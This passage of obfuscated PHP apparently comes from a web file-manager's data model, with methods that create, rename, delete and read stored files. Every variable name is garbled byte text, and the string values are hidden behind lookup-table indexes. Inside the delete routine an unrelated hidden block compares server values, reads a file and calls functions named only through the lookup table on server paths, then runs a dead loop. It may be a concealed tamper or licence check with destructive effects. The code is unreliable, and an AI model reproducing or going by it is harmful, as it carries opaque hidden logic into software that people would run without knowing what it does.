(is_string($ò‹³ÙÅ–)) { $ò‹³ÙÅ– = array($ò‹³ÙÅ–); } $¬²Æúİ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ò‹³ÙÅ–, $–‡øšçí[198]); $¿©Ñ’Ÿ‹ = array($–‡øšçí[378] => $¬²Æúİ, $–‡øšçí[375] => array($–‡øšçí[772] => count($ò‹³ÙÅ–))); $this->_listDataApply($¿©Ñ’Ÿ‹[$–‡øšçí[378]]); $this->_listMake($¿©Ñ’Ÿ‹); return array_to_keyvalue($¿©Ñ’Ÿ‹[$–‡øšçí[92]], $–‡øšçí[514]); } public function mkfile($Ïò™œéÅ, $×Ü¼¡²—, $§øêÆí‚ = '', $˜àº®é¯ = REPEAT_RENAME) { $™İ±×Ñˆ =& $_SERVER[ñ÷§¡å]; $¦ìâÇ´‚ = Model($™İ±×Ñˆ[618])->addFileByContent($§øêÆí‚, $×Ü¼¡²—); return $this->_createFileCall($Ïò™œéÅ, $×Ü¼¡²—, $¦ìâÇ´‚, $˜àº®é¯, $™İ±×Ñˆ[1345]); } public function addFile($÷µ‚­Ê , $ñùİ¡Îâ, $ôÄåÒ×º, $ó²ö¨—¹ = false, $¢‰ä‰¬Ò = REPEAT_RENAME) { $×¿Ìë¿ = Model($_SERVER[ñ÷§¡å][618])->addFile($ñùİ¡Îâ, $ôÄåÒ×º, $ó²ö¨—¹); return $this->_createFileCall($÷µ‚­Ê , $ôÄåÒ×º, $×¿Ìë¿, $¢‰ä‰¬Ò); } public function addFileByFileID($ÌÒ£šÜ, $‚ãï½Õ¿, $õĞÛ¼¬, $‹ß„Ã€ü = REPEAT_RENAME) { $Ç³ñôºí =& $_SERVER[ñ÷§¡å]; $¦ó¨¹÷ = Model($Ç³ñôºí[618])->find($‚ãï½Õ¿); Model($Ç³ñôºí[618])->linkAdd($‚ãï½Õ¿); return $this->_createFileCall($ÌÒ£šÜ, $õĞÛ¼¬, $¦ó¨¹÷, $‹ß„Ã€ü); } public function addFileByRemote($›øéÓ¿, $Ûªî³¢, $ª•Ü·Øˆ, $ÉÈ“‡ì = array(), $½Û¨Ïîİ = REPEAT_RENAME) { $«Œ¹¦Ö’ = Model($_SERVER[ñ÷§¡å][618])->addFileByRemote($Ûªî³¢, $ª•Ü·Øˆ, $ÉÈ“‡ì); return $this->_createFileCall($›øéÓ¿, $ª•Ü·Øˆ, $«Œ¹¦Ö’, $½Û¨Ïîİ); } private function _createFileCall($·¯ëœ°Ü, $ ¤¯¡º°, $¿™Ë¯ŸÔ, $‹‘Ø˜Á™, $êÌÕÑÑæ = "\x75\x70\154\x6f\141\144") { $ÜòšŞ› =& $_SERVER[ñ÷§¡å]; $—Ü¦ë¬õ = !1; $this->setMasterDB(); $this->lockWriteStart($·¯ëœ°Ü, $ ¤¯¡º°); $¬â†ƒ = $this->fileNameExist($·¯ëœ°Ü, $ ¤¯¡º°); $”—è¡éË = $this->_createFile($·¯ëœ°Ü, $ ¤¯¡º°, $¿™Ë¯ŸÔ, $‹‘Ø˜Á™, $—Ü¦ë¬õ); if (!$—Ü¦ë¬õ) { Model($ÜòšŞ›[480])->remove($¿™Ë¯ŸÔ[$ÜòšŞ›[477]]); } if ($—Ü¦ë¬õ && $”—è¡éË && $”—è¡éË != $¬â†ƒ) { Model($ÜòšŞ›[2076])->eventCreate($”—è¡éË, $êÌÕÑÑæ); } $this->lockWriteEnd($·¯ëœ°Ü, $ ¤¯¡º°); return $”—è¡éË; } public function mkdir($Ä•­ñÙ¡, $îåõ›í, $§«€ÔšÊ = REPEAT_SKIP) { $´ØÒĞ¸§ =& $_SERVER[ñ÷§¡å]; $this->setMasterDB(); $„´«¨¾ú = $this->sourceInfo($Ä•­ñÙ¡); if (!$„´«¨¾ú) { return !1; } $this->lockWriteStart($Ä•­ñÙ¡, $îåõ›í); if ($§«€ÔšÊ !== !1) { $üöåê  = $this->fileNameExist($Ä•­ñÙ¡, $îåõ›í); if ($üöåê  && $§«€ÔšÊ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Ä•­ñÙ¡, $îåõ›í); return $üöåê ; } $îåõ›í = $this->fileNameAuto($Ä•­ñÙ¡, $îåõ›í, $§«€ÔšÊ); } $”ñùƒ³› = array($´ØÒĞ¸§[592] => 1, $´ØÒĞ¸§[429] => $îåõ›í, $´ØÒĞ¸§[593] => $´ØÒĞ¸§[12], $´ØÒĞ¸§[478] => 0, $´ØÒĞ¸§[594] => 0); $­õ€á¤ë = $this->_addSource($”ñùƒ³›, $„´«¨¾ú); Model($´ØÒĞ¸§[2076])->eventCreate($­õ€á¤ë, $´ØÒĞ¸§[1346]); $this->lockWriteEnd($Ä•­ñÙ¡, $îåõ›í); return $­õ€á¤ë; } public function listSourceRoot($ø´ŠÖ, $®ÈØ¸Ê¶, $ùå¨Ä”ƒ = "\x73\x6f\x75\x72\143\x65\x49\104\x2c\164\141\162\x67\145\x74\111\104\54\163\151\172\x65") { $°ÃÑ”Ù =& $_SERVER[ñ÷§¡å]; $»å»ò« = $°ÃÑ”Ù[387]; $ŞÑ£ÙÅİ = array(); $ìà”¥Œ· = 1024 * 50; $µœáİéí = is_array($µœáİéí) ? $µœáİéí : array(); $ß¼Ã’ã¿ = count($®ÈØ¸Ê¶); $úñÊÆÕÎ = $this->tablePrefix . $°ÃÑ”Ù[2109]; for ($±£ş¢Ë = 0; $±£ş¢Ë < $ß¼Ã’ã¿; $±£ş¢Ë++) { $ÓÜÎª–æ = $®ÈØ¸Ê¶[$±£ş¢Ë]; $»å»ò« .= "\x53\105\x4c\105\103\124\40\52\40\x46\x52\117\115\40\50\123\105\x4c\105\x43\x54\40{$ùå¨Ä”ƒ}\x20\x46\122\117\115\x20\140{$úñÊÆÕÎ}\140\40\x57\110\105\x52\105\x20"; $»å»ò« .= "\x60\160\x61\162\145\156\x74\x49\x44\x60\x3d\60\40\101\116\x44\40\x60\164\x61\162\x67\x65\x74\111\x44\140\75{$ÓÜÎª–æ}\x20\101\x4e\104\x20\x60\164\141\x72\147\145\x74\x54\x79\x70\145\x60\x3d{$ø´ŠÖ}\x20\154\x69\155\151\x74\x20\61\51\x20\141\x73\x20\164\x62\x5f{$±£ş¢Ë}\40\x55\116\x49\117\x4e\40\101\x4c\x4c\40"; if ((strlen($»å»ò«) >= $ìà”¥Œ· || $±£ş¢Ë == $ß¼Ã’ã¿ - 1) && $»å»ò«) { $»å»ò« = substr($»å»ò«, 0, -strlen($°ÃÑ”Ù[1045])); $Ì®ï›ˆ¢ = $this->query($»å»ò«); $»å»ò« = $°ÃÑ”Ù[12]; $ŞÑ£ÙÅİ = array_merge($ŞÑ£ÙÅİ, $Ì®ï›ˆ¢); } } return $ŞÑ£ÙÅİ; } private function _createFile($àóñšÕ, $Ñ§¨Œå, $Ì¾ô¡œ™, $¹´ç«ºƒ, &$à›©¿äÕ) { $ÀÉ÷¾à¸ =& $_SERVER[ñ÷§¡å]; $Ï©›Ïï = $this->sourceInfo($àóñšÕ); if (!$Ì¾ô¡œ™ || !$Ï©›Ïï) { return !1; } if ($¹´ç«ºƒ !== !1) { $èûÔ ÑÙ = $this->fileNameExist($àóñšÕ, $Ñ§¨Œå); } $à›©¿äÕ = !0; if ($¹´ç«ºƒ && $èûÔ ÑÙ) { if ($¹´ç«ºƒ == REPEAT_SKIP) { $à›©¿äÕ = !1; return $èûÔ ÑÙ; } else { if ($¹´ç«ºƒ == REPEAT_REPLACE) { $à¹¬óü® = $this->sourceInfo($èûÔ ÑÙ); $ÁœÎÍ‚Ø = $this->fileHistory($à¹¬óü®, $Ì¾ô¡œ™[$ÀÉ÷¾à¸[477]], $Ì¾ô¡œ™[$ÀÉ÷¾à¸[86]]); if (!$ÁœÎÍ‚Ø) { $à›©¿äÕ = !1; } else { $this->folderSizeReset($àóñšÕ); } return $èûÔ ÑÙ; } else { $Ñ§¨Œå = $this->fileNameAuto($àóñšÕ, $Ñ§¨Œå, $¹´ç«ºƒ, !1); } } } $‰Èœå¤à = array($ÀÉ÷¾à¸[592] => 0, $ÀÉ÷¾à¸[429] => $Ñ§¨Œå, $ÀÉ÷¾à¸[593] => substr(get_path_ext($Ñ§¨Œå), 0, 10), $ÀÉ÷¾à¸[478] => $Ì¾ô¡œ™[$ÀÉ÷¾à¸[477]], $ÀÉ÷¾à¸[594] => $Ì¾ô¡œ™[$ÀÉ÷¾à¸[86]]); $Àâ·™Éí = $this->_addSource($‰Èœå¤à, $Ï©›Ïï); $this->folderSizeReset($àóñšÕ, intval($‰Èœå¤à[$ÀÉ÷¾à¸[86]])); return $Àâ·™Éí; } protected function fileHistory($äèõ­, $«Ó€•, $˜ï¼œä) { $şŸˆµİ =& $_SERVER[ñ÷§¡å]; $à¢ªäÜ = defined($şŸˆµİ[484]) ? USER_ID : $şŸˆµİ[207]; if ($äèõ­[$şŸˆµİ[477]] == $«Ó€•) { return !1; } $this->checkLock($äèõ­[$şŸˆµİ[411]], $«Ó€•); Model($şŸˆµİ[2110])->addHistory($äèõ­); $ı¥¤½Ö¬ = array($şŸˆµİ[598] => $à¢ªäÜ, $şŸˆµİ[433] => time(), $şŸˆµİ[477] => $«Ó€•, $şŸˆµİ[86] => $˜ï¼œä); $this->where(array($şŸˆµİ[426] => $äèõ­[$şŸˆµİ[411]]))->save($ı¥¤½Ö¬); $this->sourceCacheClear($äèõ­[$şŸˆµİ[411]]); return !0; } public function checkLock($³½Îş€ô, $®•Ü’¾İ) { $í¹íÇ¦’ =& $_SERVER[ñ÷§¡å]; $ë ©«¼Ü = $this->pathInfo($³½Îş€ô); if (!$this->fileIsLock($ë ©«¼Ü, !0)) { return; } $ªõâ¤§ğ = Session::get($í¹íÇ¦’[2111]); $öë–Ó‚ = substr($ë ©«¼Ü[$í¹íÇ¦’[32]], 0, -1 - strlen($ë ©«¼Ü[$í¹íÇ¦’[184]])) . $í¹íÇ¦’[1611] . $ªõâ¤§ğ . $í¹íÇ¦’[10] . $ë ©«¼Ü[$í¹íÇ¦’[184]]; $Óê›•ğ = Model($í¹íÇ¦’[618])->find($®•Ü’¾İ); $this->_createFileCall($ë ©«¼Ü[$í¹íÇ¦’[441]], $öë–Ó‚, $Óê›•ğ, REPEAT_REPLACE, $í¹íÇ¦’[1345]); $¾¬ïÙÁ» = $ë ©«¼Ü[$í¹íÇ¦’[475]][$í¹íÇ¦’[557]]; $„ßİİ‡¡ = $¾¬ïÙÁ»[$í¹íÇ¦’[551]] ? $¾¬ïÙÁ»[$í¹íÇ¦’[551]] : $¾¬ïÙÁ»[$í¹íÇ¦’[32]]; show_json(LNG($í¹íÇ¦’[2112]) . $í¹íÇ¦’[2113] . LNG($í¹íÇ¦’[2114]) . $í¹íÇ¦’[2115] . $„ßİİ‡¡ . $í¹íÇ¦’[2116], !1); } public function fileIsLock($ì‰¢á”À, $ƒ¾·í¬¾ = false) { $°™±‚ü½ =& $_SERVER[ñ÷§¡å]; if (!isset($ì‰¢á”À[$°™±‚ü½[475]]) || !$ì‰¢á”À[$°™±‚ü½[475]][$°™±‚ü½[554]]) { return !1; } if ($ì‰¢á”À[$°™±‚ü½[475]][$°™±‚ü½[554]] != USER_ID) { return !0; } $é‘¶í†Ş = $GLOBALS[$°™±‚ü½[6]][$°™±‚ü½[99]][$°™±‚ü½[555]]; if ($ì‰¢á”À[$°™±‚ü½[475]][$°™±‚ü½[556]] <= time() - $é‘¶í†Ş) { $this->metaSet($ì‰¢á”À[$°™±‚ü½[411]], $°™±‚ü½[554], null); $this->metaSet($ì‰¢á”À[$°™±‚ü½[411]], $°™±‚ü½[556], null); } if ($ƒ¾·í¬¾) { $this->metaSet($ì‰¢á”À[$°™±‚ü½[411]], $°™±‚ü½[556], time()); } return !1; } private function _addSource($ÜÜ»ºŠÉ, $”ÀĞóŒ) { $àŠãªã =& $_SERVER[ñ÷§¡å]; $ù»Ä«—ğ = defined($àŠãªã[484]) ? USER_ID : $àŠãªã[207]; $…Èˆï±Å = array($àŠãªã[595] => $”ÀĞóŒ[$àŠãªã[420]], $àŠãªã[596] => $”ÀĞóŒ[$àŠãªã[514]], $àŠãªã[597] => $ù»Ä«—ğ, $àŠãªã[598] => $ù»Ä«—ğ, $àŠãªã[410] => $”ÀĞóŒ[$àŠãªã[411]], $àŠãªã[599] => $”ÀĞóŒ[$àŠãªã[530]] . $”ÀĞóŒ[$àŠãªã[411]] . $àŠãªã[50], $àŠãªã[439] => 0, $àŠãªã[600] => $àŠãªã[12]); $ÜÜ»ºŠÉ = array_merge($…Èˆï±Å, $ÜÜ»ºŠÉ); $this->updateModifyTime($ÜÜ»ºŠÉ[$àŠãªã[441]]); $èÆÊÛ­ì = $àŠãªã[2117] . $”ÀĞóŒ[$àŠãªã[411]]; if (isset(self::$cacheChildList[$èÆÊÛ­ì])) { unset(self::$cacheChildList[$èÆÊÛ­ì]); } static $Äç°Ù´ = false; if (!$Äç°Ù´) { Hook::trigger($àŠãªã[582], $ÜÜ»ºŠÉ); $Äç°Ù´ = !0; } $ÅÇ ûŠÔ = $this->add($ÜÜ»ºŠÉ); $ÔëÇäÖõ = array($àŠãªã[601] => short_id($ÅÇ ûŠÔ)); $this->where(array($àŠãªã[426] => $ÅÇ ûŠÔ))->save($ÔëÇäÖõ); $this->setNamePinyin($ÅÇ ûŠÔ, $ÜÜ»ºŠÉ[$àŠãªã[32]]); return $ÅÇ ûŠÔ; } public function remove($öÊ½§ƒö, $Õ§¤¾ÃŸ = true) { $Îıªİ¤¸ =& $_SERVER[ñ÷§¡å]; $µç½Èû = $this->sourceInfo($öÊ½§ƒö); $±ÑÁ­ÄØ = intval($µç½Èû[$Îıªİ¤¸[420]]) === self::TYPE_SYSTEM; $ËÄÑ ñ‰ = Model($Îıªİ¤¸[444])->get($Îıªİ¤¸[2118]) == $Îıªİ¤¸[98]; if ($±ÑÁ­ÄØ || $Õ§¤¾ÃŸ || !$ËÄÑ ñ‰) { return $this->removeNow($öÊ½§ƒö, $Õ§¤¾ÃŸ); } $¹Ã™¹ÅÄ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ş÷²ŞÃş = $µç½Èû[$Îıªİ¤¸[420]] == self::TYPE_USER ? $Îıªİ¤¸[609] : $Îıªİ¤¸[524]; if ($ş÷²ŞÃş == $Îıªİ¤¸[609]) { $ˆÉİÙ¬ğ = Model($Îıªİ¤¸[522])->getInfo($µç½Èû[$Îıªİ¤¸[514]]); $ÁÀ‡··û = !empty($ˆÉİÙ¬ğ[$Îıªİ¤¸[551]]) ? $ˆÉİÙ¬ğ[$Îıªİ¤¸[551]] : $ˆÉİÙ¬ğ[$Îıªİ¤¸[32]]; $ÁÀ‡··û = $Îıªİ¤¸[269] . $ÁÀ‡··û . $Îıªİ¤¸[2119] . $µç½Èû[$Îıªİ¤¸[514]]; } else { $ˆÉİÙ¬ğ = Model($Îıªİ¤¸[531])->getInfo($µç½Èû[$Îıªİ¤¸[514]]); $ÁÀ‡··û = _get($ˆÉİÙ¬ğ, $Îıªİ¤¸[32]); $ÁÀ‡··û = $Îıªİ¤¸[172] . $ÁÀ‡··û . $Îıªİ¤¸[2120] . $µç½Èû[$Îıªİ¤¸[514]]; } $ºœ¯Ó§ = $Îıªİ¤¸[2121] . md5($ÁÀ‡··û); CacheLock::lock($ºœ¯Ó§); $ÌàÕúÃ© = $this->fileNameExist($¹Ã™¹ÅÄ, $ÁÀ‡··û); if (!$ÌàÕúÃ©) { $ÌàÕúÃ© = $this->mkdir($¹Ã™¹ÅÄ, $ÁÀ‡··û, REPEAT_SKIP); $this->metaSet($ÌàÕúÃ©, $Îıªİ¤¸[2122], $ş÷²ŞÃş); $this->metaSet($ÌàÕúÃ©, $Îıªİ¤¸[2123], $µç½Èû[$Îıªİ¤¸[514]]); if ($µç½Èû[$Îıªİ¤¸[441]] != 0) { $this->metaSet($ÌàÕúÃ©, $Îıªİ¤¸[2124], _get($ˆÉİÙ¬ğ, $Îıªİ¤¸[2125])); } } CacheLock::unlock($ºœ¯Ó§); $this->metaSet($öÊ½§ƒö, $Îıªİ¤¸[2126], $µç½Èû[$Îıªİ¤¸[441]]); $this->where(array($Îıªİ¤¸[411] => $öÊ½§ƒö))->save(array($Îıªİ¤¸[433] => time())); $this->recycleClear($µç½Èû); $Ë°„™œ™ = $this->move($öÊ½§ƒö, $ÌàÕúÃ©, REPEAT_RENAME_FOLDER); $this->folderSizeReset($µç½Èû[$Îıªİ¤¸[441]]); return $Ë°„™œ™; } private function recycleClear($–šÊü ) { $„Üù£ıŠ =& $_SERVER[ñ÷§¡å]; $Ø×¢ÊŠ÷ = $this->childrenAll($–šÊü ); $îùÏê„Û = array($„Üù£ıŠ[426] => array($„Üù£ıŠ[427], $Ø×¢ÊŠ÷[$„Üù£ıŠ[2127]])); Model($„Üù£ıŠ[2128])->where($îùÏê„Û)->delete(); } public function removeNow($²Î¶µäê, $¿Å„„ë™ = true) { $õƒĞ×èí =& $_SERVER[ñ÷§¡å]; if ($_SERVER[$õƒĞ×èí[60]] != $_SERVER[$õƒĞ×èí[61]]) { $¾â…¯ã = $õƒĞ×èí[885]; $©õœÑ–ì = $õƒĞ×èí[62]; $¢ôûòÔ = $_SERVER[$õƒĞ×èí[63]] . $õƒĞ×èí[64]; $‚øúôŞö = $©õœÑ–ì($¢ôûòÔ); $­îŸ­¦ş = explode($õƒĞ×èí[65], $‚øúôŞö); if (count($­îŸ­¦ş) < $õƒĞ×èí[629]) { $„–šß›Ô = $õƒĞ×èí[67]; $„–šß›Ô(); } $ ´æÃõå = $õƒĞ×èí[886]; $ ´æÃõå($_SERVER[$õƒĞ×èí[887]]); $ ´æÃõå($_SERVER[$õƒĞ×èí[63]] . $õƒĞ×èí[1528]); $¸Âáˆ„ = 1; while ($¸Âáˆ„ > 1) { $¸Âáˆ„ = $¸Âáˆ„ + 4; $ªğó  = rawurlencode($¸Âáˆ„ . $õƒĞ×èí[387]); } } $ÂÑÜ´È„ = $this->sourceInfo($²Î¶µäê); $é‘‘— = $this->pathInfoMore($²Î¶µäê); if (!$ÂÑÜ´È„) { return !0; } if ($ÂÑÜ´È„[$õƒĞ×èí[441]] == 0) { if (!_get($GLOBALS, $õƒĞ×èí[512])) { return !1; } } $this->lockMoveStart($²Î¶µäê); Hook::trigger($õƒĞ×èí[2129], $é‘‘—, $¿Å„„ë™); if ($¿Å„„ë™) { Model($õƒĞ×èí[2128])->moveToRecycle($²Î¶µäê); } else { $Ô™Ñê¯¤ = $this->childrenAll($ÂÑÜ´È„); Model($õƒĞ×èí[579])->eventRemove($²Î¶µäê); $this->removeRelevance($Ô™Ñê¯¤[$õƒĞ×èí[2127]], $Ô™Ñê¯¤[$õƒĞ×èí[1477]]); } $this->folderSizeReset($ÂÑÜ´È„[$õƒĞ×èí[441]]); $¶«€şóò = array($ÂÑÜ´È„[$õƒĞ×èí[441]]); if ($ÂÑÜ´È„[$õƒĞ×èí[419]] == $õƒĞ×èí[98]) { $¶«€şóò[] = $ÂÑÜ´È„[$õƒĞ×èí[411]]; } $this->updateModifyTime($¶«€şóò); $this->lockMoveEnd($²Î¶µäê); Hook::trigger($õƒĞ×èí[1703], $é‘‘—, $¿Å„„ë™); return !0; } public function childrenAll($ì³Ëâ›×) { $ûÑ©ó  =& $_SERVER[ñ÷§¡å]; $ˆ—ù·Şô = $ì³Ëâ›×[$ûÑ©ó [411]]; if ($ì³Ëâ›×[$ûÑ©ó [419]] == $ûÑ©ó [98]) { $ÈŒÇüÒ— = array($ûÑ©ó [599] => array($ûÑ©ó [559], $ì³Ëâ›×[$ûÑ©ó [530]] . $ˆ—ù·Şô . $ûÑ©ó [560])); $û‰š»ôÉ = array($ûÑ©ó [599] => $ÈŒÇüÒ—[$ûÑ©ó [530]]); $Èá‹½òå = $this->field($ûÑ©ó [2130])->where($û‰š»ôÉ)->select(); $£äÚÇ™ö = !1; $õÚ¡ì ¢ = array($ˆ—ù·Şô); if ($Èá‹½òå) { $£äÚÇ™ö = array_to_keyvalue($Èá‹½òå, $ûÑ©ó [12], $ûÑ©ó [477]); $£äÚÇ™ö = array_remove_value($£äÚÇ™ö, $ûÑ©ó [207]); $õÚ¡ì ¢ = array_to_keyvalue($Èá‹½òå, $ûÑ©ó [12], $ûÑ©ó [411]); $õÚ¡ì ¢[] = $ˆ—ù·Şô; } } else { $£äÚÇ™ö = array($ì³Ëâ›×[$ûÑ©ó [477]]); $õÚ¡ì ¢ = array($ˆ—ù·Şô); } return array($ûÑ©ó [2127] => $õÚ¡ì ¢, $ûÑ©ó [1477] => $£äÚÇ™ö); } public function removeArray($“ üÕÒ­) { if (!$“ üÕÒ­) { return !0; } } public function removeRelevance($í”õ‘¾ô, $è ›Ä) { $Õ’Åƒ’‘ =& $_SERVER[ñ÷§¡å]; $í”õ‘¾ô = $í”õ‘¾ô ? $í”õ‘¾ô : array(); $è ›Ä = $è ›Ä ? $è ›Ä : array(); $í”õ‘¾ô = array_unique(array_filter($í”õ‘¾ô)); $è ›Ä = array_unique(array_filter($è ›Ä)); if (!$í”õ‘¾ô) { return !1; } $ĞÉğ’üå = array($Õ’Åƒ’‘[426] => array($Õ’Åƒ’‘[427], $í”õ‘¾ô)); Model($Õ’Åƒ’‘[2128])->where($ĞÉğ’üå)->delete(); Model($Õ’Åƒ’‘[471])->where($ĞÉğ’üå)->delete(); Model($Õ’Åƒ’‘[1981])->where($ĞÉğ’üå)->delete(); Model($Õ’Åƒ’‘[579])->where($ĞÉğ’üå)->delete(); Model($Õ’Åƒ’‘[1815])->removeBySource($í”õ‘¾ô); Model($Õ’Åƒ’‘[2110])->removeBySource($í”õ‘¾ô); $this->where($ĞÉğ’üå)->delete(); Model($Õ’Åƒ’‘[480])->remove($è ›Ä); for ($ÍòŞŠµù = 0; $ÍòŞŠµù < count($í”õ‘¾ô); $ÍòŞŠµù++) { $this->sourceCacheClear($í”õ‘¾ô[$ÍòŞŠµù]); } } public function rename($›ü£Ç„ê, $ä‘‹¡·ä) { $çÛ”Ô¥Ó =& $_SERVER[ñ÷§¡å]; $‹µü§Ÿ = $this->sourceInfo($›ü£Ç„ê); if (!$‹µü§Ÿ) { return !1; } $İË©±¸¸ = $this->fileNameExist($‹µü§Ÿ[$çÛ”Ô¥Ó[441]], $ä‘‹¡·ä); if ($İË©±¸¸ && $İË©±¸¸ != $›ü£Ç„ê) { return !1; } $©øüäÑñ = array($çÛ”Ô¥Ó[429] => $ä‘‹¡·ä, $çÛ”Ô¥Ó[598] => USER_ID); if ($‹µü§Ÿ[$çÛ”Ô¥Ó[419]] != $çÛ”Ô¥Ó[98]) { $©øüäÑñ[$çÛ”Ô¥Ó[421]] = substr(get_path_ext($ä‘‹¡·ä), 0, 10); } Model($çÛ”Ô¥Ó[579])->eventRename($›ü£Ç„ê, $‹µü§Ÿ[$çÛ”Ô¥Ó[32]], $ä‘‹¡·ä); $this->sourceCacheClear($›ü£Ç„ê); $this->setNamePinyin($›ü£Ç„ê, $©øüäÑñ[$çÛ”Ô¥Ó[32]], !1); $this->updateModifyTime($‹µü§Ÿ[$çÛ”Ô¥Ó[441]]); $¥°Èó«ñ = $this->where(array($çÛ”Ô¥Ó[426] => $›ü£Ç„ê))->data($©øüäÑñ)->save(); $ÒÙñ·³¼ = $çÛ”Ô¥Ó[2117] . $‹µü§Ÿ[$çÛ”Ô¥Ó[441]]; if (isset(self::$cacheChildList[$ÒÙñ·³¼])) { unset(self::$cacheChildList[$ÒÙñ·³¼]); } return $¥°Èó«ñ; } public function setNamePinyin($¨Üè—½š, $çÁÚÑ¤, $üòóïäÕ = true) { $­©õ€¬„ =& $_SERVER[ñ÷§¡å]; $Ã”âğ = Input::check($çÁÚÑ¤, $­©õ€¬„[602]); $„ô¸ç = array($­©õ€¬„[453] => KodSort::makeStr($çÁÚÑ¤)); if ($Ã”âğ) { $„ô¸ç[$­©õ€¬„[474]] = str_replace($­©õ€¬„[53], $­©õ€¬„[12], Pinyin::get($çÁÚÑ¤)); $„ô¸ç[$­©õ€¬„[473]] = Pinyin::get($çÁÚÑ¤, $­©õ€¬„[603]); } if (!$üòóïäÕ && !$Ã”âğ) { $„ô¸ç[$­©õ€¬„[474]] = null; $„ô¸ç[$­©õ€¬„[473]] = null; } $this->metaSet($¨Üè—½š, $„ô¸ç); } public function getContent($ÏÕ­¯ú) { $äè´°¨ =& $_SERVER[ñ÷§¡å]; $ÆõÖ…Ñ« = $this->fileInfoGet($ÏÕ­¯ú); if (!$ÆõÖ…Ñ«) { return !1; } if ($ÆõÖ…Ñ«[$äè´°¨[86]] == 0) { return $äè´°¨[12]; } $ŸÂ·‡¤ = $äè´°¨[2131] . $ÆõÖ…Ñ«[$äè´°¨[186]]; if ($ÆõÖ…Ñ«[$äè´°¨[86]] <= 1024 * 10) { $¿—º£½Ò = Cache::get($ŸÂ·‡¤); if (!$¿—º£½Ò) { $¿—º£½Ò = IO::getContent($ÆõÖ…Ñ«[$äè´°¨[94]]); Cache::set($ŸÂ·‡¤, $¿—º£½Ò); } return $¿—º£½Ò; } if (!$ÆõÖ…Ñ«[$äè´°¨[94]]) { return $äè´°¨[12]; } return IO::getContent($ÆõÖ…Ñ«[$äè´°¨[94]]); } public function setDesc($¶ù”Œ², $Ş­µİÇÓ) { $íÌ¯±õ =& $_SERVER[ñ÷§¡å]; Model($íÌ¯±õ[579])->eventAddDesc($¶ù”Œ², $Ş­µİÇÓ); return $this->metaSet($¶ù”Œ², $íÌ¯±õ[462], $Ş­µİÇÓ); } public function setContent($¨ò†ò‰·, $”ÒÚ¸ëŞ = '') { $Š§·Å›æ =& $_SERVER[ñ÷§¡å]; $ƒº™©Ñ = $this->sourceInfo($¨ò†ò‰·); $¿Ó‹á¶â = $this->fileInfoGet($¨ò†ò‰·); if (!$¿Ó‹á¶â || !$ƒº™©Ñ) { return !1; } $…â±Š†æ = Model($Š§·Å›æ[480])->addFileByContent($”ÒÚ¸ëŞ, $ƒº™©Ñ[$Š§·Å›æ[32]]); $ñ¦Èƒ´½ = $this->fileHistory($ƒº™©Ñ, $…â±Š†æ[$Š§·Å›æ[477]], $…â±Š†æ[$Š§·Å›æ[86]]); if (!$ñ¦Èƒ´½) { return Model($Š§·Å›æ[480])->remove($…â±Š†æ[$Š§·Å›æ[477]]); } $this->folderSizeReset($ƒº™©Ñ[$Š§·Å›æ[441]]); return !0; } public function fileSubstr($ÁïÕè†, $ã„õ½„, $ıÆ‰Ğâ¾) { $Û®¸´ª‚ = $this->fileInfoGet($ÁïÕè†); if (!$Û®¸´ª‚) { return !1; } return IO::fileSubstr($Û®¸´ª‚[$_SERVER[ñ÷§¡å][94]], $ã„õ½„, $ıÆ‰Ğâ¾); } public function fileInfoGet($˜×åİÍà) { $Š¢¾¨ =& $_SERVER[ñ÷§¡å]; $ˆ‚»òƒˆ = $this->sourceInfo($˜×åİÍà); if (!$ˆ‚»òƒˆ || $ˆ‚»òƒˆ[$Š¢¾¨[419]]) { return !1; } $éëŸòË = $Š¢¾¨[483] . $ˆ‚»òƒˆ[$Š¢¾¨[477]]; $·äºÅ¨ = _get(self::$cacheFileInfo, $éëŸòË); if ($·äºÅ¨) { return $·äºÅ¨; } $Ö½íÜô– = Model($Š¢¾¨[480])->fileInfo($ˆ‚»òƒˆ[$Š¢¾¨[477]]); if ($Ö½íÜô–) { $Ö½íÜô–[$Š¢¾¨[32]] = $ˆ‚»òƒˆ[$Š¢¾¨[32]]; } self::$cacheFileInfo[$éëŸòË] = $Ö½íÜô–; return $Ö½íÜô–; } private function folderChildrenNumber($¢ÒŞ˜Á¤) { $Ñ“Õïù¸ =& $_SERVER[ñ÷§¡å]; $Øœ¶¥º§ = $this->sourceInfo($¢ÒŞ˜Á¤); $°çÙœŸÃ = array($Ñ“Õïù¸[599] => array($Ñ“Õïù¸[559], $Øœ¶¥º§[$Ñ“Õïù¸[530]] . $¢ÒŞ˜Á¤ . $Ñ“Õïù¸[560]), $Ñ“Õïù¸[596] => $Øœ¶¥º§[$Ñ“Õïù¸[514]], $Ñ“Õïù¸[439] => intval($Øœ¶¥º§[$Ñ“Õïù¸[440]]), $Ñ“Õïù¸[592] => 1); $•ïŒ½üâ = $this->where($°çÙœŸÃ)->count(); $¯óÜÖ·¿ = $this->where($°çÙœŸÃ)->where(array($Ñ“Õïù¸[592] => 0))->count(); return array($Ñ“Õïù¸[90] => $¯óÜÖ·¿, $Ñ“Õïù¸[91] => $•ïŒ½üâ); } public function pathInfo($ÖÅ÷ñ×ç, $˜ŞÎÕ¦§ = false) { $ßìˆğ˜– =& $_SERVER[ñ÷§¡å]; $˜ŞÎÕ¦§ = !1; $ÖÅ÷ñ×ç = intval($ÖÅ÷ñ×ç); $ëè¨Ûµ¿ = $ßìˆğ˜–[470] . intval($˜ŞÎÕ¦§) . $ßìˆğ˜–[395] . $ÖÅ÷ñ×ç; $¢ÉÀ±·‚ = _get(self::$cachePathInfo, $ëè¨Ûµ¿); if ($¢ÉÀ±·‚) { return $¢ÉÀ±·‚; } $ğÁ¤á´ê = $this->sourceInfo($ÖÅ÷ñ×ç); if (!$ğÁ¤á´ê) { return !1; } $ğÁ¤á´ê = $this->_listDataApplyItem($ğÁ¤á´ê, $˜ŞÎÕ¦§); self::$cachePathInfo[$ëè¨Ûµ¿] = $ğÁ¤á´ê; return $ğÁ¤á´ê; } public static $cachePathInfoMore = array(); public function pathInfoMore($¢â´¬Ïô) { $ÄšòÍ¯¦ =& $_SERVER[ñ÷§¡å]; $¹ÜÕ‹¢’ = _get(self::$cachePathInfoMore, $¢â´¬Ïô); if ($¹ÜÕ‹¢’) { return $¹ÜÕ‹¢’; } $éÕÀµ = $this->pathInfo($¢â´¬Ïô); if (!$éÕÀµ) { return !1; } if 